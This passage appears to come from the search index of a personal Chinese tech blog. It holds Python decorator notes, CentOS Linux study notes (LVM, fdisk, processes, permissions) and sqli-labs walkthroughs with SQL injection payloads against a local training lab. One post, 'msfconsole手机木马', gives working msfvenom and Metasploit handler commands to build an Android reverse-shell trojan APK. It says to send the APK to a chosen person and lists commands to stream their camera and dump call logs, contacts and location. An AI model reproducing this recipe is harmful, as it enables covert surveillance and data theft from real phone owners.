#10\n```\n\n#### 装饰器\n\n```python\nimport time\ndef  show_time(f):   \n#f函数名是一个外部形参变量，show_time就是一个装饰器\n    def inner():  #inner是一个闭包函数，可调用f\n        start=time.time()\n        f()\n        end=time.time()\n        print(\"time=%d\",(end-start))\n    return inner\ndef foo():\n    print(\"foo....\")\n```\n\n第一种调用方式：\n\n```python\nfoo=show_time(foo)\nfoo()\n```\n\n第二种调用方式：\n\n```python\n@show_time #foo=show_time(foo)\nfoo()\n```\n\n#### 装饰器函数的参数：\n\n```python\nimport time\ndef logger(flag=''):\n    def show_time(f):\n        def inner(*x,**y):\n            start=time.time()\n            f(*x,**y)\n            end=time.time()\n            print(\"time=%d\",(end-start))\n            if (flag=='ture'):\n                print(\"日志记录\")\n        return inner\n    return show_time\n@logger('')   #调用装饰器函数传入参数 判断是否打印日志文件\ndef foo():\n    print(\"foo0......\")\n    time.sleep(3)\nfoo()\n@logger('ture')\ndef add(*a,**b): #a为函数add的不定长参数 可传入多值\n    sum=0\n    for i in a:\n        sum+=i\n    print(sum)\n    time.sleep(1)\nadd(1,2,3,4,5,7,8) #传入多值\n\n```\n\n### 简单实现登录系统功能：\n\n```python\nsername,password='chen','123'  #使用‘jd’方式登录的账号密码验证库\nwxname,wxpasswd='wang','567'   #使用‘wx’\noption = False        #判断是否登录的标志位\ndef choseup(a=''):  #登录方式选择  装饰器参数\n    def up(f):  #装饰器函数  \n        def inner():\n            if option == False :\n                if a=='jd':\n                    user1=input(\"username=\\n\")\n                    passwd1=input(\"password=\\n\")\n                    if user1==username and passwd1==password :\n                        print(\"登录成功\")\n                        f()\n                        option == True\n                    else:\n                        print(\"账号密码错误请重新登录\")\n                        inner()\n                elif a=='wx':\n                    user2=input(\"username=\\n\")\n                    passwd2=input(\"password=\\n\")\n                    if user2==wxname and passwd2==wxpasswd:\n                        print(\"登录成功\")\n                        f()\n                        option == True\n                    else:\n                        print(\"账号密码错误请重新登录\")\n                        inner()\n            else: pass\n        return inner\n    return up\n\n \n@choseup('jd')    #传输参数‘jd’，选择登录方式为jd\ndef sort_page1():  \n    print(\"welcome to home\")\n@choseup('wx')  #传输参数‘wx’，选择登录方式为wx\ndef sort_page2():\n    print(\"welcome to finale\")\n@choseup('jd')\ndef sort_page3():\n    print(\"welcome to book\")\n\n\ndef a():\n    x = input(\"1.home\\n2.finale\\n3.book\\n\")  \n#x返回字符串类型\"1\"  \"2\"  \"3\"  不是 1 2 3   \n#此点导致调了一下午 切记\n    print('您的选择为：',x)\n    if (x == '1'):   #\n        sort_page1()\n    elif (x == '2'):\n        sort_page2()\n    elif (x == '3'):\n        sort_page3()\na()\n\n\n```\n\n","tags":["python"]},{"title":"基于centos7的linux学习8","url":"%2F2019%2F08%2F26%2F%E5%9F%BA%E4%BA%8Ecentos7%E7%9A%84linux%E5%AD%A6%E4%B9%A08%2F","content":"\n### 逻辑卷管理\n\n##### LVM 相关概念\n\nLVM 是建立在硬盘或分区上的一个逻辑层，为文件系统屏蔽下层磁盘分区布局，从而来提高磁盘分区管理的灵活性。\n\n##### LVM 基本术语\n\n1.物理卷 PV\n\n- 物理卷在 LVM 系统中处于最底层。\n\n- 物理卷可以是整个磁盘、硬盘上的分区、或从逻辑上与磁盘分区具有同样功能的设备。\n\n- 物理卷是 LVM 的基本存储逻辑块，但和基本的物理存储介质（如分区、磁盘）比较，却包含有与 LVM 相关的管理参数。\n\n  2.卷组 VG \n\n  - 卷组建立在物理卷之上，由一个或多个物理卷组成。\n  - 卷组创建之后，可以动态的添加物理卷到卷组中，在卷组上可以创建一个或多个 LVM 分区。\n  - 一个 LVM 系统中可以只有一个卷组，也可以包含多个卷组。\n\n  3.逻辑卷 LV\n\n  - 逻辑卷建立在卷组之上，是从卷组中‘切出’的一块空间。\n  - 逻辑卷创建之后，大小可以伸缩。\n  - LVM 的逻辑卷类似于非 LVM 系统中的硬盘分区，在逻辑卷之上可以建立文件系统。\n\n  4.物理区域 PE\n\n  - 每一个物理卷被划分为基本单位（称为 PE），具有唯一编号的 PE 是可以被 LVM 寻址的最小存储单元。\n  - PE 的大小可根据实际情况在创建物理卷时指定，默认为 4 MB。\n  - PE 的大小一旦确定将不能被改变，同一个卷组中所有物理卷的 PE 大小一致。\n\n  5.逻辑区域 LE\n\n  - 逻辑区域也被划分为可被寻址的基本单位 （称为 LE）。\n  - 在同一个卷组中，LE 的大小和 PE 是相同的，并一一对应。\n\n  逻辑卷以及卷组相关的元数据保存在位于物理卷起始处的卷组描述符区域（VGDA）中。VGDA 包含以下内容：PV 描述符 、VG 描述符 、LV 描述符 、 PE 描述符。\n\n  ![1](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/asdadadasd.png)\n\n  ### PV-VG-LV 的设备名\n\n  |      | 含义                 | 设备名                      |\n  | ---- | -------------------- | --------------------------- |\n  | PV   | 物理卷：磁盘或分区   | /dev/sda?                   |\n  | VG   | 卷组：一组磁盘或分区 | /dev/\\<VG name>/ 目录       |\n  | LV   | 逻辑卷： LVM 分区    | /dev/\\<VG name>/ \\<LV name> |\n\n  \n\n  ","tags":["linux"]},{"title":"msfconsole手机木马","url":"%2F2019%2F08%2F26%2Fmsfconsole%E6%89%8B%E6%9C%BA%E6%9C%A8%E9%A9%AC%2F","content":"\n### 生成手机apk木马\n\n`msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.3.73 LPORT=8888 R>1.apk`\n\n![1](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/A.png)\n\n### 攻击模块设置\n\n`use exploit/multi/handler `\n\n`set payload android/meterpreter/reverse_tcp`\n\n`set LHOST 192.168.3.73`\n\n`set LPORT 8888`\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/BMP6%5B%288K7%24U2LSUN%40NYT_%252.png)\n\n### 木马发送到指定人，等待上线\n\n![3](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/Screenshot_2019-08-26-12-25-37-509_com.miui.packa.png)\n\n弹回shell后可尝试执行：\n\n`webcam_stream -i 1/2 ` 打开前置或后置摄像头\n\n`dump_calllog` 下载电话记录\n\n`dump_contacts` 获取通讯录\n\n`geolocate` 定位（需要下载goole地图） ","tags":["kali"]},{"title":"web漏洞","url":"%2F2019%2F08%2F20%2Fweb%E6%BC%8F%E6%B4%9E%2F","content":"\n### Sql注入\n\n这个已经拿出来单写了，等我这个小白把sqli-lab打通关吧！\n\n### Xss\n\n\n\n","tags":["漏洞"]},{"title":"基于centos的linux学习7","url":"%2F2019%2F08%2F18%2F%E5%9F%BA%E4%BA%8Ecentos%E7%9A%84linux%E5%AD%A6%E4%B9%A07%2F","content":"\n### 本地存储管理\n\n本地存储管理的任务主要包括磁盘分区、逻辑卷管理、文件系统管理。\n\n使用文件系统的基本步骤：\n\n1.在硬盘上创建分区或逻辑卷\n\n2.在分区或逻辑卷上创建文件系统\n\n3.挂载文件系统到系统中\n\n- 手动挂装文件系统可以使用 mount 命令\n- 若需要系统每次启动时都自动挂装文件系统，需修改 /etc/fstab 文件\n\n4.卸载文件系统\n\n对于可移动介质上的文件系统，使用完毕后，需要使用 umount 命令实施卸载操作或执行eject命令直接弹出光盘。\n\n### linux 中支持的文件系统\n\nlinux 的内核采用了虚拟文件系统（VFS），支持多种不同的类型格式，每一种类型的文件系统都提供一个公共的软件接口给 VFS。\n\nCentos 7 中支持的常见文件系统\n\n| 文件系统   | 软件包      | 说明                                                         |\n| ---------- | ----------- | ------------------------------------------------------------ |\n| ext2       | e2fsprogs   | linux 的标准文件系统，是 ext 文件系统的后续版本。            |\n| ext3，ext4 | e2fsprogs   | 由 ext2 扩展的日志文件系统。                                 |\n| xfs        | xfsprogs    | 由 SGI 开发的一种日志文件系统，RHEL/Centos7 默认使用的文件系统。 |\n| btrfs      | btrfs-progs | 有望成为下一代linux标准文件系统，支持可写的磁盘快照（snapshots）、内建的磁盘阵列(RAID)和子卷（Subvolumes)等功能。 |\n| vfats      | dosfstools  | windows95 和 windowNT 上使用的支持长文件名的DOS文件系统扩展。 |\n| ntfs-3g    | ntfs-3g     | windows 的 NTFS 系统。                                       |\n| ISO9660    | genisoimage | 标准 CD-ROM 文件系统类型。                                   |\n| swap       | util-linux  | 在 linux 中作为交换分区使用，交换分区用于操作系统管理内存的交换空间。 |\n\n### 硬盘及分区\n\n##### 1.硬盘及其分类\n\n机械硬盘：主要由盘片、磁头、盘片转轴及控制电机、磁头控制器、数据转换器、接口、缓存等几个部分组成。\n\n固态硬盘：由固态电子存储芯片阵列而制成的，无机械部件。\n\n##### 硬盘接口方式\n\nPATA(俗称IDE) 接口、SATA 接口、SCSI 接口、SAS 接口和 FC-AL 接口。\n\n个人桌面多采用 SATA 接口，服务器多采用 SCSI、SAS 和 FC-AL 接口。\n\nFC-AL 接口主要应用于任务级的关键数据的大容量实时存储。可以满足高性能、高可靠性和高扩展性的存储需要。\n\nSCSI 接口主要应用于商业级的关键数据和大容量存储。\n\nSAS 接口可以支持 SAS 和 SATA 磁盘，很方便的满足不同性价比的存储需求。\n\nSATA 接口主要应用于非关键数据的大量存储，进线存储和非关键性应用。\n\n### 使用fdisk分区\n\n格式:\n\n`fdisk <硬盘设备名>`   //进入fdisk的交互操作方式，对指定的硬盘进行分区操作。\n\n`fdisk -l <硬盘设备名>` //在命令行方式下显示指定硬盘的分区表信息\n\nfdisk 的子命令\n\n| 命令 | 说明                     | 命令 | 说明                           |\n| ---- | ------------------------ | ---- | ------------------------------ |\n| a    | 可分区设置可启动标志     | p    | 列出硬盘分区表                 |\n| d    | 删除一个硬盘分区         | q    | 退出fdisk，不保存更改          |\n| l    | 列出所以支持的分区类型   | t    | 更改分区类型                   |\n| m    | 列出所有命令说明         | u    | 切换所显示的分区大小的单位     |\n| n    | 创建一个新的分区         | w    | 把设置写入硬盘分区表，然后退出 |\n| o    | 创建 DOS  类型的空分区表 | g    | 创建 GPT 类型的空分区表        |\n\n进入分区设置\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/PE24_GOFO%40_%7B%24QL_7%25PM2PW.png)\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/AB.png)\n\no: 创建 DOS 类型的空分区表\n\nn: 创建新的分区\n\n参数：\n\n`Partion number` 分区号 `First sector` 起始扇区 `Last sector` last 扇区 可选大小 \n\n![3](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/BJY%291NVF6%60T4_LJEBAH6X%5DN.png)\n\n![2](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/%7DAR4_%28L4%5DS_36Q%7DJ%605Q%40ASY.png)\n\np:显示当前分区\n\nd:删除已经存在的分区\n\n![5](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/E0RDPSH%5B%28%5B%25B%40R_Z%7DBLC%5DZB.png)\n\ne:对所有磁盘剩余空间创建编号为3的扩展分区\n\nl:创建逻辑分区\n\n![6](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/H4B%5DUZ_F5QQ7U06GKO6%7B0PB.png)\n\nt:修改分区类型\n\n参数：\n\n`partition number` 分区号 `Hex code` Hex代码\n\n5 Extened\n\n82 linux swap / Solaris\n\n83 linux\n\n8e linux LVM\n\n![1](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/51%5BQU7A1XD6%29U6_V%605%5DT7%24C.png)\n\nw:保存 \n\npartprobe /dev/sda 重新读取分区表\n\n","tags":["linux"]},{"title":"基于centos的linux学习6","url":"%2F2019%2F08%2F17%2F%E5%9F%BA%E4%BA%8Ecentos%E7%9A%84linux%E5%AD%A6%E4%B9%A06%2F","content":"\n### 进程管理\n\n进程概念：一个程序在其自身的虚拟地址空间中的一次执行活动。\n\n### linux中的进程\n\n在多用户多任务的linux系统中，每个进程都与运行的用户和组相关联，除了进程识别号PID外，在进程控制块PCB中每个进程还有另外4个与用户和组相关的识别号。\n\nRUID：实际用户识别号\n\nRGID：实际组识别号\n\nEUID：有效用户识别号\n\nEGID：有效组识别号\n\nRUID、RGID是用来识别正在运行此进程的用户和组。EUID、EGID用来确定一个进程对其访问的文件的权限和优先权。\n\n### 进程的类型\n\n交互进程：有一个shell启动的进程，交互既可以在前台运行，也可以在后台运行。\n\n批处理进程：不同于特定的终端相关联，提交到等待队列中顺序执行的进程。\n\n守护进程：在linux启动时初始化，需要时运行与后台的进程。\n\n### 进程的启动方式\n\n（1.）手工启动\n\n前台启动：手动启动一个进程的最常用方式。\n\n后台启动：使用&命令。\n\n（2.）调度启动\n\n### 查看进程\n\n| 命令  | 说明                    |\n| ----- | ----------------------- |\n| ps    | 查看进程的详细信息      |\n| pgrep | 通过模式匹配查找进程id  |\n| pidof | 通过进程名获取进程的pid |\n\nps 格式：`ps [选项]`\n\n参数：\n\n| 选项 | 说明                       | 选项           | 说明                                     |\n| ---- | -------------------------- | -------------- | ---------------------------------------- |\n| a    | 显示所有进程               | f/-H           | 显示进程树，等价于--forest               |\n| e    | 在命令后显示环境变量       | w/-w           | 宽行输出，通常用于显示完整的命令行       |\n| u    | 显示用户名和启动时间等信息 | -e             | 显示所有进程 等价于--A                   |\n| x    | 显示没有控制终端的进程     | -f             | 完全显示，增加用户名，ppid，进程起始时间 |\n| o/-o | 用户自定义输出             | --sort\\<order> | 指定按那些列排序                         |\n\nps输出的消息含义\n\n| 输出项 | 说明                      | 输出项      | 说明                                |\n| ------ | ------------------------- | ----------- | ----------------------------------- |\n| PID    | 进程号                    | TIME        | 进程自从启动以来占用cpu的时间       |\n| PPID   | 父进程的进程号            | USER        | 用户名                              |\n| TTY    | 进程从哪个终端启动        | %CPU        | 占用cpu时间与时间的百分比           |\n| STAT   | 进程的当前状态            | %MEM        | 占用内存与系统内存总量的百分比      |\n| START  | 进程开始执行的时间        | SIZE        | 进程代码大小+数据大小+栈空间大小 KB |\n| VSZ    | 进程占用的虚拟内存空间 KB | COMMAND/CMD | 进程的命令名                        |\n| RSS    | 进程所占用的内存的空间 KB |             |                                     |\n\n进程状态STAT一栏表示状态的字符含义\n\n| 状态 | 说明                                                       |\n| ---- | ---------------------------------------------------------- |\n| R    | 进程正在执行中                                             |\n| S    | 进程处于睡眠状态                                           |\n| T    | 追踪或停止                                                 |\n| Z    | 僵尸进程，进程已经被终止，但其父进程并不知道，没有妥善处理 |\n| W    | 进程没有固定的pages                                        |\n| <    | 高优先级的进程                                             |\n| N    | 低优先级的进程                                             |\n\n![1](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/b.png)\n\n### 杀死进程\n\n发生以下情况需要杀死进程\n\n- 进程占用了过多的cpu时间\n- 进程锁住了一个终端，使得前台进程无法运行\n- 进程运行时间过长，但没有预期效果或者无法正常退出\n- 进程产生了过多的到屏幕或磁盘文件的输出\n\n进程信号\n\n概念：进程信号是在软件层次上对中断机制的一种模拟，进程信号是最基本的进程间通信方式，可以在进程之间直接发送。\n\n使用`kill -l`或  `man 7 signal` 可以查看可以的进程信号。\n\n常用进程信号说明\n\n| 信号    | 数值 | 用途                              |\n| ------- | ---- | --------------------------------- |\n| SIGHUP  | 1    | 重读配置文件                      |\n| SIGINT  | 2    | 从键盘上发出的强行终止信号 ctrl+c |\n| SIGKILL | 9    | 结束接受信号的进程 强行杀死进程   |\n| SIGTERM | 15   | 正常的终止信号                    |\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/c.png)\n\n### 可以发送进程信号的命令\n\n| 命令    | 说明                                 |\n| ------- | ------------------------------------ |\n| kill    | 通过指定进程的PID为进程发送进程信号  |\n| killall | 通过指定进程的名称为进程发送进程信号 |\n| pkill   | 通过模式匹配为指定的进程发送进程信号 |\n\n### 进程控制\n\n概念：控制当前正在运行的进程的行为。\n\n进程控制常用命令：\n\n| 命令或快捷键 | 功能说明                                 |\n| ------------ | ---------------------------------------- |\n| cmd&         | 命令后的&符号表示该命令放到后台执行      |\n| nohup cmd &  | 将该命令放到后台运行，用户注销后依然执行 |\n| ctrl+d       | 终止一个正在前台运行的进程 正常          |\n| ctrl+c       | 终止一个正在前台运行的进程 强行          |\n| ctrl+z       | 挂起一个正在前台运行的进程               |\n| jobs         | 显示后台作业和被挂起的进程               |\n| bg           | 在后台恢复运行一个被挂起的进程           |\n| fg           | 在前台恢复一个被挂起的进程               |\n\n","tags":["linux"]},{"title":"基于centos的linux学习5","url":"%2F2019%2F08%2F16%2F%E5%9F%BA%E4%BA%8Ecentos%E7%9A%84linux%E5%AD%A6%E4%B9%A05%2F","content":"\n### 1.权限管理\n\n3种基本权限\n\n| 代表字符 | 权限     | 对文件的含义     | 对目录的含义                 |\n| -------- | -------- | ---------------- | ---------------------------- |\n| r        | 读权限   | 可以读文件的内容 | 可以列出目录的文件列表       |\n| w        | 写权限   | 可以修改文件     | 可以在该目录中创建，删除文件 |\n| x        | 执行权限 | 可以执行该文件   | 可以使用cd切进目录           |\n\nlinux基本权限位含义\n\n| 权限位 | 含义             |\n| ------ | ---------------- |\n| 1      | 文件类型         |\n| 2-4    | 文件所属主的权限 |\n| 5-7    | 文件所属组的权限 |\n| 8-10   | 其他用户权限     |\n\n当某用户访问系统中的某文件时：\n(1.)若访问的uid与文件的UID匹配，应用用户user权限。\n\n(2.)否则，若访问者的GID与文件的GID匹配，应用群组group的权限。\n\n(3.)如果都不匹配，应用其他用户other权限。\n\n更改权限操作\n\n格式：`chmod[ugoa][+-=][rwxugo]<文件名/目录名>\n\n第一个选项表示要赋予权限的用户\n\n| 选项 | 说明                | 选项 | 说明            |\n| ---- | ------------------- | ---- | --------------- |\n| u    | 表示属主user        | o    | 表示其他用户    |\n| g    | 表示所属组用户group | a    | 表示所有用户all |\n\n第二个选项表示要进行的操作\n\n| 选项 | 说明     | 选项 | 说明                         |\n| ---- | -------- | ---- | ---------------------------- |\n| +    | 增加权限 | =    | 分配权限，同时将原有权限删除 |\n| -    | 删除权限 | ——   | ——                           |\n\n第三个选项是要分配的权限\n\n| 选项 | 说明     | 选项 | 说明                 |\n| ---- | -------- | ---- | -------------------- |\n| r    | 允许读取 | u    | 和属主的权限相同     |\n| w    | 允许写入 | g    | 和所属组用户权限相同 |\n| x    | 允许执行 | o    | 和其他用户的权限相同 |\n\n格式：`chmodn1n2n3<文件名/目录名>`\n\nr：4            w：2           x：1\n\n更改属主和同组人\n\n格式：`chowm[-R]<用户：组><文件/目录>`\n\n设置文件和目录的生成掩码\n\n默认的生成掩码使得创建一个新文件或目录时不应该赋予它的权限。\n\n格式：`umask[-S][u1][u2][u3]`\n\nu1：不允许属主的权限\n\nu2：不允许同组人有的权限\n\nu3：不允许其他人有的权限\n\neg：\n\n```\numask      #查看默认的掩码值\n0022\numask -S   #默认掩码值情况下新建文件的权限分配\nu=rwx,g=rx,o=rx\n```\n\n特殊权限设置\n\n1.SUID、SGID和syicky-bit\n\n文件的特殊权限说明：\n\n| 特殊权限 | 说明                                                         |\n| -------- | ------------------------------------------------------------ |\n| SUID     | 以该文件所有者的身份运行，而不是命令执行者的权限。无论谁来执行，都是文件所有者的权限，任意存取该文件拥有者能使用的全部系统资源。 |\n| SGID     | 以该文件所属组的身份运行，而不是命令执行者的权限。无论谁来执行，都是文件所属组的权限，任意存在整个组能使用的系统资源。 |\n\n目录的特殊权限说明：\n\n| 特殊权限  | 说明                                                         |\n| --------- | ------------------------------------------------------------ |\n| SGID      | 在目录中创建以及其他文件被复制到该目录时，其所有组都会被重设为和该目录一致。除了复制时加上-p 保留文件属性参数。 |\n| stick-bit | 存放在该目录的文件仅准许其所属主执行删除、移动等操作。       |\n\n2.SUID、SGID和stick-bit的表示\n\nSUID占用属主的x位置来表示的，SGID是占用组的x的位置来表示的，stick-bit是占用其他人的x位置来表示的。\n\n字符设定：\n\n相应位置上s、t参数设置\n\n数字设定：\n\nSUID s：4     SGID s：2    stick-bit t：1\n\neg：\n\n```\nchmod u+s 1.txt  为1.txt文件设置SUID权限\nchmod g+s 1.txt  为1.txt文件设置GUID权限\nchmod o+t /usr/bin  为/usr/bin设置stick-bit权限\nchmod 4755 1.txt\nchmod 2755 /usr/bin\nchmod 1755 /usr/bin\n```\n\n使用ACL权限\n\nUGO：传统的UNIX/linux设置权限的方式\n\nACL：访问控制表\n\n- 存取ACL，针对文件和目录访问控制列表、\n- 默认ACL，只能针对目录设置。\n\n使用setfacl设置ACL权限\n\n格式：`setfacl[-R]{-m|-x}<rules><files/directory>`\n\n| 选项     | 说明                                                         |\n| -------- | ------------------------------------------------------------ |\n| -R       | 对目录进行递归操作                                           |\n| -m       | 修改ACL权限                                                  |\n| -x       | 删除ACL权限                                                  |\n| \\<rules> | 指定ACL规则<br />[d:]u:uid:perms: 为指定的用户设置ACL权限<br />[d:]g:gid:perms: 为指定的组设置ACL权限<br />[d:]o:[:]perms: 为其他用户设置ACL权限<br />[d:]m:[:]perms: 设置有效的访问掩码<br /><br />使用d:前缀时用于设置默认ACL(d:只能对目录设置)<br />perms为r、w、x、-或其组合 |\n\neg：`setfacl -m u:chen:rwx 1.txt`\n\n使用getfacl查看ACL权限\n\n格式：`getfacl<file/directory>`\n\n若目录已经设置了默认的ACL，新建的文件从其目录继承默认ACL。\n\n使用mv、cp -p操作文件是将保持ACL设置。\n\n\n\n---\n\n\n\n未完待续......\n\n人们只愿看到自己想看到的一切，分不清是非对错，黑白颠倒。--Hades\n\n","tags":["linux"]},{"title":"sqli-labs20-30","url":"%2F2019%2F08%2F16%2Fsqli-labs20-30%2F","content":"\n### 20-22cookie注入\n\n第二十题后台主要代码：`$sql=\"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1\";`\n\n在第一次登陆验证以后会将第二次的cookie值带入数据库进行查询，可以利用第二次的cookie值进行注入。\n\npayload1：`uname=admin'&passwd=1`\n\npayload2：`uname=admin' and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)) --+`\n\n第二十一题后台主要代码：`$cookee = base64_decode($cookee);$sql=\"SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1\";`\n\n与第20题原理一样，只是需要对括号进行闭合，以及base64编码。\n\npayload1：`uname=admin')&passwd=1`\n\npayload2：`uname=YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBzY2hlbWFfbmFtZSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5zY2hlbWF0YSBsaW1pdCAwLDEpLDB4N2UpKSAj`\n\n第二十二题后台主要代码：\n\n```php\n$cookee = base64_decode($cookee);\n$cookee1 = '\"'. $cookee. '\"';\n$sql=\"SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1\";\n```\n\n需要对引号闭合，但是第一次登录可以不用管闭合的事情。\n\npayload1：`uname=admin&passwd=1`\n\npayload2：`:uname=YWRtaW4nIiBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBzY2hlbWFfbmFtZSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5zY2hlbWF0YSBsaW1pdCAwLDEpLDB4N2UpKSAj`\n\n### 23对注释过滤\n\n第二十三题后台主要代码：\n\n```php\n$reg = \"/#/\";\n$reg1 = \"/--/\";\n$replace = \"\";\n$id = preg_replace($reg, $replace, $id);\n$id = preg_replace($reg1, $replace, $id);   //正则匹配$id中的$reg1字符串替换为$replace\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n```\n\n只要不用注释去闭合后面的单引号就可以 \n\npayload：`http://127.0.0.1/sqli-labs/Less-23/?id=1' union select 1,2,3 and  '1'='1`\n\n![1.](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/BXCPBWARJ7EEFXFW%28IA7Y2A.png)\n\n### 24二次注入\n\n第二十四题后台有8个文件，与数据库进行交互的有以下几个地方：\n\n`login.php`:  \n\n```php\n$username = mysql_real_escape_string($_POST[\"login_user\"]);\n$password = mysql_real_escape_string($_POST[\"login_password\"]);\n$sql = \"SELECT * FROM users WHERE username='$username' and password='$password'\";\n```\n\n`login_create.php`:\n\n`$sql = \"insert into users ( username, password) values(\\\"$username\\\", \\\"$pass\\\")\";`\n\n`pass_change.php`:\n\n`$sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \";`\n\n对源码分析以后，我们该如何利用？\n\n二次注入的原理在于我们第一次插入的代码可以在第二次时候构成注入，使得我们达到想要的效果。\n\n我们先注册一个`username=admin'#` `password=123` 的用户。\n\n![2](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/_9VF_VEX%24L%28CUCW9F2%5BO3KN.png)\n\n使用该账号登录，修改密码的时候构成二次注入，可修改`admin`账号的密码。\n\n![4](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/ABC.png)\n\n![3](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/_9L3UW1IX%28OBF%7BQL5U7W75A.png)\n\n### 25and，or 过滤\n\n打开第25关，就看见`All your 'or' and 'and' belong to us!` 行吧。\n\n我们试试双写呗，看你过滤几个。\n\npayload：`http://127.0.0.1/sqli-labs/Less-25/?id=-1' union select 1,2,3  oorr '1'='1`\n\n看到显示位了，也就过滤了一个。\n\n继续构造就好了。\n\n### 26空格，注释，or，and过滤\n\n后台主要代码：\n\n```php\nfunction blacklist($id)\n{\n\t$id= preg_replace('/or/i',\"\", $id);\t\t\t//strip out OR (non case sensitive)\n\t$id= preg_replace('/and/i',\"\", $id);\t\t//Strip out AND (non case sensitive)\n\t$id= preg_replace('/[\\/\\*]/',\"\", $id);\t\t//strip out /*\n\t$id= preg_replace('/[--]/',\"\", $id);\t\t//Strip out --\n\t$id= preg_replace('/[#]/',\"\", $id);\t\t\t//Strip out #\n\t$id= preg_replace('/[\\s]/',\"\", $id);\t\t//Strip out spaces\n\t$id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id);\t\t//Strip out slashes\n\treturn $id;\n}\n```\n\n过滤的挺多的，可以尝试xml函数报错注入。\n\npayload：`http://127.0.0.1/sqli-labs/Less-26/?id=1'||extractvalue(1,concat(0x7e,database(),0x7e))||'1'='1`\n\n![5](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/B%60OW%29E9V%40G_CV6%2837JB%7B7%291.png)\n\n### 27,28UNION，SELECT过滤\n\n27题就是变态啊，看了代码基本啥都过滤，对小白极度不友好啊！\n\n```php\nfunction blacklist($id)\n{\n$id= preg_replace('/[\\/\\*]/',\"\", $id);\t\t//strip out /*\n$id= preg_replace('/[--]/',\"\", $id);\t\t//Strip out --.\n$id= preg_replace('/[#]/',\"\", $id);\t\t\t//Strip out #.\n$id= preg_replace('/[ +]/',\"\", $id);\t    //Strip out spaces.\n$id= preg_replace('/select/m',\"\", $id);\t    //Strip out spaces.\n$id= preg_replace('/[ +]/',\"\", $id);\t    //Strip out spaces.\n$id= preg_replace('/union/s',\"\", $id);\t    //Strip out union\n$id= preg_replace('/select/s',\"\", $id);\t    //Strip out select\n$id= preg_replace('/UNION/s',\"\", $id);\t    //Strip out UNION\n$id= preg_replace('/SELECT/s',\"\", $id);\t    //Strip out SELECT\n$id= preg_replace('/Union/s',\"\", $id);\t    //Strip out Union\n$id= preg_replace('/Select/s',\"\", $id);\t    //Strip out select\nreturn $id;\n}\n```\n\n直接上报错注入了：\n\n`http://127.0.0.1/sqli-labs/Less-26/?id=1'||extractvalue(1,concat(0x7e,database(),0x7e))||'1'='1`\n\n### 29，30这两个题好像挺水的\n\n没有过滤什么，可以直接注入。\n\n29payload：\n\n`http://127.0.0.1/sqli-labs/Less-29/?id=-1%27%20union%20select%201,database(),3%20or%20%271%27=%271`\n\n![5](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/C_4FVBU%25N%7BRQI%5BWNVUR4Z%5DX.png)\n\n30payload：\n\n`http://127.0.0.1/sqli-labs/Less-30/?id=0\" union select 1,database(),3--+`\n\n![5](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/YC.png)\n\n注：26-28看很多大佬有用%a0代替空格注入成功的，也尝试了一下，但是好像都被解析成 ‘？’了，所以就只写了报错的注入方式。","tags":["sql注入"]},{"title":"sqli-labs1-20","url":"%2F2019%2F08%2F15%2Fsqli-labs1-20%2F","content":"\n想想自己最开始瞎搞，接触到的东西就是sql注入，但是除了网站url后面加单引号就啥也不会了。\n\n这次系统的学完sql注入，也再尝试着去把这些知识学明白，渗透还是要去多练习的，就自己搭了sqli-labs的靶场，记一下学习过程。\n\n不一定按照关卡来，一类的就归在一起了，主要是记录自己学习的东西。\n\n复习一下mysql中的三种注释方式：\n\n- #\n- \\-- \n- /**/\n\n### 1-2就是单纯的引号的闭合\n\n第一题后端主要代码`$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";`\n\n第二题后端主要代码`$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";`\n\n### 3-4需要闭合括号和引号\n\n第三题后端主要代码`$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";`\n\n第四题后端主要代码`$sql=\"SELECT * FROM users WHERE id=($id) LIMIT 